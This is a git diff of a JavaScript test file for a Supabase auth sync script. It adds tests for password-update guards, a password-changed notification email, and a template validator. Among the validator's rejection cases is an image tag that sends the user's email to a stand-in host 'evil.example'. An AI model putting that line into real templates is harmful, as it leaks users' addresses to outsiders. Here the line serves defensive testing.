@@ -3,7 +3,9 @@ import { readFile } from 'node:fs/promises';
 
 import {
   isSatisfied,
+  isSafePasswordChangedTemplate,
   isSafeRecoveryTemplate,
+  passwordGuardPatch,
   syncSupabaseAuth,
   mailerPatch,
   missingSmtpSettings,
@@ -70,6 +72,53 @@ describe('repository Auth redirect contract', () => {
     expect(productionJobEnv).not.toContain('SUPABASE_ACCESS_TOKEN');
     expect(productionJob.match(/SUPABASE_ACCESS_TOKEN: \$\{\{ secrets\.SUPABASE_ACCESS_TOKEN \}\}/g))
       .toHaveLength(2);
+  });
+});
+
+describe('repository password update guard contract', () => {
+  it('turns the guards on everywhere and the change notification on in production only', async () => {
+    const [localConfig, pipeline, template] = await Promise.all([
+      readFile(new URL('../supabase/config.toml', import.meta.url), 'utf8'),
+      readFile(new URL('../.github/workflows/pipeline.yml', import.meta.url), 'utf8'),
+      readFile(new URL('../supabase/templates/password_changed_notification.html', import.meta.url), 'utf8'),
+    ]);
+
+    // Production, isolated PR, shared preview and persistent staging each own a sync step.
+    expect(pipeline.match(/PASSWORD_UPDATE_GUARDS: "true"/g)).toHaveLength(4);
+    expect(pipeline.match(/PASSWORD_CHANGED_TEMPLATE_PATH: /g)).toHaveLength(1);
+    const productionSupabaseJob = pipeline.slice(
+      pipeline.indexOf('  deploy-supabase:'),
+      pipeline.indexOf('  deploy-supabase-preview:'),
+    );
+    expect(productionSupabaseJob).toContain(
+      'PASSWORD_CHANGED_TEMPLATE_PATH: supabase/templates/password_changed_notification.html',
+    );
+    expect(productionSupabaseJob).toContain('PASSWORD_CHANGED_SUBJECT: ICONS 비밀번호 변경 안내');
+
+    expect(localConfig).toContain('secure_password_change = true');
+    expect(localConfig).toContain('[auth.email.notification.password_changed]');
+    expect(localConfig).toContain('subject = "ICONS 비밀번호 변경 안내"');
+    expect(localConfig).toContain('content_path = "./templates/password_changed_notification.html"');
+    expect(isSafePasswordChangedTemplate(template)).toBe(true);
+  });
+});
+
+describe('password changed email template contract', () => {
+  const reset = '<a href="{{ .SiteURL }}/login?mode=reset">reset</a>';
+
+  it('allows one reset link to the site and the account email', () => {
+    expect(isSafePasswordChangedTemplate(`<p>{{ .Email }}</p>${reset}`)).toBe(true);
+    expect(isSafePasswordChangedTemplate(reset)).toBe(true);
+  });
+
+  it('rejects other links, variables, and hidden markup', () => {
+    expect(isSafePasswordChangedTemplate('<p>{{ .Email }}</p>')).toBe(false);
+    expect(isSafePasswordChangedTemplate(`${reset}${reset}`)).toBe(false);
+    expect(isSafePasswordChangedTemplate('<a href="https://iconsip.com/login?mode=reset">reset</a>')).toBe(false);
+    expect(isSafePasswordChangedTemplate(`${reset}<a href="https://evil.example">help</a>`)).toBe(false);
+    expect(isSafePasswordChangedTemplate(`${reset}<p>{{ .Data.nickname }}</p>`)).toBe(false);
+    expect(isSafePasswordChangedTemplate(`${reset}<img src="https://evil.example/p?e={{ .Email }}">`)).toBe(false);
+    expect(isSafePasswordChangedTemplate(`<!-- ${reset} -->`)).toBe(false);
   });
 });
 
@@ -275,6 +324,43 @@ describe('isSatisfied', () => {
     })).toBe(false);
   });
 
+  it('비밀번호 가드 중 하나라도 꺼져 있으면 통과하지 않는다', () => {
+    const guarded = {
+      ...base,
+      security_update_password_require_current_password: true,
+      security_update_password_require_reauthentication: true,
+    };
+    expect(isSatisfied({ ...args, config: guarded, enforceMailer: false, enforcePasswordGuards: true }))
+      .toBe(true);
+    expect(isSatisfied({
+      ...args,
+      config: { ...guarded, security_update_password_require_reauthentication: false },
+      enforceMailer: false,
+      enforcePasswordGuards: true,
+    })).toBe(false);
+    expect(isSatisfied({ ...args, config: base, enforceMailer: false, enforcePasswordGuards: true }))
+      .toBe(false);
+  });
+
+  it('비밀번호 변경 알림의 켜짐·제목·본문이 선언값과 다르면 통과하지 않는다', () => {
+    const passwordChanged = { subject: 'ICONS 비밀번호 변경 안내', template: '<a href="{{ .SiteURL }}/login?mode=reset">reset</a>' };
+    const notified = {
+      ...base,
+      mailer_notifications_password_changed_enabled: true,
+      mailer_subjects_password_changed_notification: passwordChanged.subject,
+      mailer_templates_password_changed_notification_content: `${passwordChanged.template}\n`,
+    };
+    expect(isSatisfied({ ...args, config: notified, enforceMailer: false, passwordChanged })).toBe(true);
+    for (const drift of [
+      { mailer_notifications_password_changed_enabled: false },
+      { mailer_subjects_password_changed_notification: 'Your password has been changed' },
+      { mailer_templates_password_changed_notification_content: '<p>old</p>' },
+    ]) {
+      expect(isSatisfied({ ...args, config: { ...notified, ...drift }, enforceMailer: false, passwordChanged }))
+        .toBe(false);
+    }
+  });
+
   it('email link TTL이 선언값과 다르면 통과하지 않는다', () => {
     expect(isSatisfied({
       ...args,
@@ -288,6 +374,19 @@ describe('isSatisfied', () => {
       enforceMailer: false,
       emailOtpExpirySeconds: 3600,
     })).toBe(false);
+  });
+});
+
+describe('passwordGuardPatch', () => {
+  it('강제하지 않으면 비밀번호 가드를 건드리지 않는다', () => {
+    expect(passwordGuardPatch({ enforcePasswordGuards: false })).toEqual({});
+  });
+
+  it('강제하면 현재 비밀번호와 재인증을 모두 요구한다', () => {
+    expect(passwordGuardPatch({ enforcePasswordGuards: true })).toEqual({
+      security_update_password_require_current_password: true,
+      security_update_password_require_reauthentication: true,
+    });
   });
 });
 
@@ -413,6 +512,54 @@ describe('syncSupabaseAuth', () => {
 
     await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
     expect(JSON.parse(calls[1].body).mailer_otp_exp).toBe(3600);
+  });
+
+  it('비밀번호 가드와 변경 알림을 PATCH하고 read-back으로 검증한다', async () => {
+    const templatePath = new URL('../supabase/templates/password_changed_notification.html', import.meta.url).pathname;
+    const template = (await readFile(templatePath, 'utf8')).trim();
+    const env = {
+      ...baseEnv,
+      PASSWORD_UPDATE_GUARDS: 'true',
+      PASSWORD_CHANGED_TEMPLATE_PATH: templatePath,
+      PASSWORD_CHANGED_SUBJECT: 'ICONS 비밀번호 변경 안내',
+    };
+    const allowList = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
+    const managed = {
+      security_update_password_require_current_password: true,
+      security_update_password_require_reauthentication: true,
+      mailer_notifications_password_changed_enabled: true,
+      mailer_subjects_password_changed_notification: 'ICONS 비밀번호 변경 안내',
+      mailer_templates_password_changed_notification_content: template,
+    };
+    const { calls, fetchStub } = stubFetch([
+      ok({
+        site_url: 'https://iconsip.com',
+        uri_allow_list: allowList,
+        security_update_password_require_current_password: false,
+        security_update_password_require_reauthentication: false,
+        mailer_notifications_password_changed_enabled: false,
+      }),
+      ok({}),
+      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, ...managed }),
+    ]);
+    vi.stubGlobal('fetch', fetchStub);
+
+    await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
+    expect(JSON.parse(calls[1].body)).toEqual({
+      site_url: 'https://iconsip.com',
+      uri_allow_list: allowList,
+      ...managed,
+    });
+  });
+
+  it('알림 본문만 주고 제목을 빼면 네트워크를 타지 않고 던진다', async () => {
+    const templatePath = new URL('../supabase/templates/password_changed_notification.html', import.meta.url).pathname;
+    const { calls, fetchStub } = stubFetch([]);
+    vi.stubGlobal('fetch', fetchStub);
+
+    await expect(syncSupabaseAuth({ ...baseEnv, PASSWORD_CHANGED_TEMPLATE_PATH: templatePath }, () => {}))
+      .rejects.toThrow('PASSWORD_CHANGED_SUBJECT is required');
+    expect(calls).toEqual([]);
   });
 
   it('SMTP를 요구했는데 없으면 PATCH 전에 던진다', async () => {
